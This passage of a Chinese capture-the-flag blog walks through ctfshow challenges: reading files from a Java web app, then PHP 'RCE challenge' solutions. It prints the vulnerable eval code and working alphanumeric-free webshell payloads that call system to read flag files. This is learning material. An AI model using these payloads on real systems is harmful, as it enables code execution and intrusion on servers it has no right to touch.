src="../images/image-20230224201233523.png" alt="image-20230224201233523"></p><p>发现了一个题目给的注释，然后去尝试了一下发现是可以进行文件读取的。</p><p>这里的话给的是php，但是在java中，默认的文件应该是<code>index.jsp</code></p><p><img src="../images/image-20230224201453984.png" alt="image-20230224201453984"></p><p>去读WEB-INF/web.xml，发现存在con.ctfshow.servlet.GetFlag</p><p><img src="../images/image-20230224201722256.png" alt="image-20230224201722256"></p><p>这个路径是根据上一题的java文件得出的  <strong>一般来说 web.xml都是在这个路径下</strong></p><p>这里的 <strong>web.xml</strong>  可以看这篇文章来进行学习学习  <a href="https://www.cnblogs.com/linhuaming/p/9464356.html">文章</a></p><p>进行 web.xml的读取</p><p><img src="../images/image-20230224202057625.png" alt="image-20230224202057625"></p><p>然后进行读取WEB-INF/classes/com/ctfshow/servlet/GetFlag.class，因为是class文件字符有点乱，发现fl3g</p><p>这里为什么是这个路径的话，是因为上一题的java压缩包里的路径，然后就根据其推断出。</p><p><img src="../images/image-20230224202206393.png" alt="image-20230224202206393"></p><p>但是   是不是所有的默认文件都是这个路径的话我就不知道了，因为刚开始学java</p><p><img src="../images/image-20230224202349505.png" alt="image-20230224202349505"></p><p>发现这个flag所在的文件</p><p>然后进行读取</p><p><img src="../images/image-20230224202445941.png" alt="image-20230224202445941"></p><h2 id="web300-文件读取"><a href="#web300-文件读取" class="headerlink" title="web300-文件读取"></a>web300-文件读取</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 10:52:43</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 10:54:20</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解题方法和上题一样，</p><p><img src="../images/image-20230224202801282.png" alt="image-20230224202801282"></p><p>java漏洞就大概了解完了，那么我们就开始去学习java反序列化，边做题边学习java了。</p><p><strong>以上的题目如果输入env只出来半截的，可以去看我写的web297的题解</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow java 刷题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-RCE极限挑战</title>
      <link href="/posts/aeb7a8fc.html"/>
      <url>/posts/aeb7a8fc.html</url>
      
        <content type="html"><![CDATA[<h2 id="RCE挑战1"><a href="#RCE挑战1" class="headerlink" title="RCE挑战1"></a>RCE挑战1</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;(&quot;</span>,<span class="string">&quot;括号&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;点&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里只是把().给过滤掉了，直接使用不带点和括号的RCE方式就可以了，比如日志文件包含，临时文件包含</p><p>还有更简单的</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=<span class="keyword">echo</span> `<span class="variable">$_POST</span>[<span class="number">1</span>]`;&amp;<span class="number">1</span>=cat /f*</span><br></pre></td></tr></table></figure><h2 id="RCE挑战2"><a href="#RCE挑战2" class="headerlink" title="RCE挑战2"></a>RCE挑战2</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>python脚本</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$a</span> = <span class="number">0</span>; <span class="variable">$a</span> &lt; <span class="number">256</span>; <span class="variable">$a</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>)).<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跑了一下正则，才发现只有这几个东西能进行利用</p><p><img src="../images/image-20230220195106844.png" alt="image-20230220195106844"></p><p>这道题利用的是<strong>自增rce</strong></p><p>p牛之前的文章也写过这个</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></p><p>思路就是，我们rce需要字母，但字母都过滤了，所以我们就要想办法去构造字母，p神是用</p><p>强制连接数组和字符串，数组将被转换成字符串，其值为<code>Array，而我们如果取Array的第[0]</code>个字母的话就是A，而A++就是B</p><p><img src="../images/37853e892a9643ac805787746756841c.png" alt="img"></p><p><strong>payload1</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_=[].<span class="string">&#x27;&#x27;</span>;  //得到Array</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_=<span class="variable">$_</span>[<span class="string">&#x27;/&#x27;</span>==<span class="string">&#x27;+&#x27;</span>];   //让[]里的值报错返回0,取Array[0]=A，此时<span class="variable">$_</span>=A</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____=<span class="string">&#x27;_&#x27;</span>;   //让<span class="variable">$____</span>=_，后面容易拼接</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__=<span class="variable">$_</span>;   //将A赋给<span class="variable">$__</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;  //A自增到G，此时<span class="variable">$__</span>=G</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____.=<span class="variable">$__</span>; //将_和G拼接起来，此时<span class="variable">$____</span>=_G</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__=<span class="variable">$_</span>;   //再将<span class="variable">$__</span>还原成A</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;  //A自增到E,此时__=E</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____.=<span class="variable">$__</span>;  //E和_G拼接，此时<span class="variable">$____</span>为_GE</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__=<span class="variable">$_</span>;  //再将__换源成A</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;  //A自增成T此时__=T</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____.=<span class="variable">$__</span>;  //再拼接成_GET，此时<span class="variable">$____</span>=_GET</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_=<span class="variable">$____</span>;   //为了方便起见，我们把____换成_</span></span><br><span class="line"><span class="meta prompt_">($</span><span class="language-bash"><span class="variable">$_</span>[_])($<span class="variable">$_</span>[__]);  //拼成我们想要的(<span class="variable">$_GET</span>[_])(<span class="variable">$_GET</span>[__]),传入_和__命令执行即可</span>  </span><br></pre></td></tr></table></figure><p><strong>payload2</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_=[].<span class="string">&#x27;&#x27;</span>;//Array</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;$&#x27;</span>];//A</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____=<span class="string">&#x27;_&#x27;</span>;//_</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__=<span class="variable">$_</span>;//A</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;//P</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____.=<span class="variable">$__</span>;//_P</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__=<span class="variable">$_</span>;//A</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;//O</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____.=<span class="variable">$__</span>;//_PO</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__=<span class="variable">$_</span>;//A</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;//S</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____.=<span class="variable">$__</span>;//_POS</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__=<span class="variable">$_</span>;//A</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;//T</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____.=<span class="variable">$__</span>;//_POST</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_=<span class="variable">$____</span>;//_POST</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="variable">$_</span>[__]($<span class="variable">$_</span>[_]);//<span class="variable">$_POST</span>[__](<span class="variable">$_POST</span>[_]);</span></span><br></pre></td></tr></table></figure><p>这里为什么能用自增是因为$_是会记录上一次的值</p><p><strong>最终paylaod</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=%24%5F%3D%5B%5D%2E%27%27%3B%24%5F%3D%24%5F%5B%27%27%3D%3D%27%24%27%5D%3B%24%5F%5F%5F%5F%3D%27%5F%27%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%3D%24%5F%5F%5F%5F%3B%24%24%5F%5B%5F%5F%5D%28%24%24%5F%5B%5F%5D%29%3B&amp;__=system&amp;_=cat /f1agaaa</span><br></pre></td></tr></table></figure><h2 id="RCE挑战3"><a href="#RCE挑战3" class="headerlink" title="RCE挑战3"></a>RCE挑战3</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">105</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z2-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230220200800189.png" alt="image-20230220200800189"></p><p>这里是少了！’ 多了01</p><p>开始限制长度了，105字符，但是可以用数字0或者1，那么就可以通过(0/0)来构造float型的NAN，(1/0)来构造float型的INF，然后转换成字符串型，得到”NAN”和”INF”中的字符了，payload构造过程，这里直觉上认为构造<code>_GET</code>更简单，但是实际上目前可以用的字符当中，只有N离T最近，而从N开始自增构造T的时候，会经过OPQRS，所以其实构造<code>_GET</code> 的同时，已经把<code>_POST</code>构造出来了，相当于白构造了<code>GE</code></p><p>这里的话</p><p><img src="../images/image-20230220204020605.png" alt="image-20230220204020605"></p><p>字母的话可以随便取代，因为在这里的话字母会被当作0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NaN（Not a Number，非数）是计算机科学中数值数据类型的一类值，表示未定义或不可表示的值。常在浮点数运算中使用。首次引入NaN的是1985年的IEEE 754浮点数标准。</span><br><span class="line"></span><br><span class="line">INF：infinite，表示“无穷大”。 超出浮点数的表示范围（溢出，即阶码部分超过其能表示的最大值）。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>原理还是上一题的自增，试着构造一下，当我是想直接$a[0]的时候，他没有回显，原来是因为现在的NAN还不算字符串,所以后面要在拼接一个例如</p><p><img src="../images/image-20230220204318669.png" alt="image-20230220204318669"></p><p>拼接一个字符的话就会变成字符串了。</p><p>但我我们需要字母才能构造N，就用上一题同样的方法构造出A来，因为0可以用了，所以我们就不用让报错直接用[0]就可以了</p><p><img src="../images/7bbcda92852545ce97dbd2d22b130783.png" alt="img"></p><p>这里能得到A是因为[].[]会变成Array,然后Array[0]就会生成A；</p><p><strong>和RCE挑战2构造方法一样</strong></p><p>然后我们就可以得到N了</p><p><img src="../images/fc6729792a6c44d68b05e5e91c2b82a7.png" alt="img"></p><p>这里能得到N是因为$_为A，然后A的话会变成0，然后再连接字符串A就可以了</p><p><code>$__=(A/A.A)[0]</code>就是会变成这样</p><p>之后再跟上一步一样一步一步自增就可以了</p><p><strong>payload</strong>1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=([].[])[<span class="number">0</span>];    <span class="comment">//得到Array</span></span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$_</span>/<span class="variable">$_</span>.<span class="variable">$_</span>)[<span class="number">0</span>];   <span class="comment">//__=N</span></span><br><span class="line"><span class="variable">$_</span>++;  <span class="comment">//O</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>++;  <span class="comment">//拼接PO</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;  <span class="comment">//S</span></span><br><span class="line"><span class="variable">$__</span>.=<span class="variable">$_</span>; <span class="comment">//拼接POS</span></span><br><span class="line"><span class="variable">$_</span>++;  <span class="comment">//T</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$__</span>.<span class="variable">$_</span>;  <span class="comment">//拼接_和POST</span></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[<span class="number">1</span>]);  <span class="comment">//$_POST[0]($_POST[1])</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=([].[])[0];$_=($_/$_.$_)[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$__.=$_;$_++;$_=_.$__.$_;$$_[0]($$_[1]);</span><br></pre></td></tr></table></figure><p><strong>paylaod2</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=(<span class="number">0</span>/<span class="number">0</span>);<span class="comment">//NAN</span></span><br><span class="line"><span class="variable">$a</span>.=_;<span class="comment">//NAN_</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$a</span>[<span class="number">0</span>];<span class="comment">//N</span></span><br><span class="line"><span class="variable">$a</span>++;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$o</span>=<span class="variable">$a</span>++;<span class="comment">//$o=$a++是先把$a的值给$o,然后再对$a进行自增，所以这一句结束的时候 $a是P，$o是O</span></span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$a</span>++;<span class="comment">//$a=&gt;Q,$p=&gt;P</span></span><br><span class="line"><span class="variable">$a</span>++;<span class="variable">$a</span>++;<span class="comment">//R</span></span><br><span class="line"><span class="variable">$s</span>=<span class="variable">$a</span>++;<span class="comment">//S</span></span><br><span class="line"><span class="variable">$t</span>=<span class="variable">$a</span>;<span class="comment">//T</span></span><br><span class="line"><span class="variable">$_</span>=_;<span class="comment">//_</span></span><br><span class="line"><span class="variable">$_</span>.=<span class="variable">$p</span>.<span class="variable">$o</span>.<span class="variable">$s</span>.<span class="variable">$t</span>;<span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[<span class="number">1</span>]);<span class="comment">//$_POST[0]($_POST[1]);</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$%ff=(<span class="number">0</span>/<span class="number">0</span>);$%ff.=_;$%ff=$%ff[<span class="number">0</span>];$%ff%<span class="number">2</span>b%<span class="number">2</span>b;$%fd=$%ff%<span class="number">2</span>b%<span class="number">2</span>b;$%fe=$%ff%<span class="number">2</span>b%<span class="number">2</span>b;$%ff%<span class="number">2</span>b%<span class="number">2</span>b;$%ff%<span class="number">2</span>b%<span class="number">2</span>b;$%fc=$%ff%<span class="number">2</span>b%<span class="number">2</span>b;$%fb=$%ff;<span class="variable">$_</span>=_;<span class="variable">$_</span>.=$%fe.$%fd.$%fc.$%fb;<span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[<span class="number">1</span>]);&amp;<span class="number">0</span>=system&amp;<span class="number">1</span>=cat 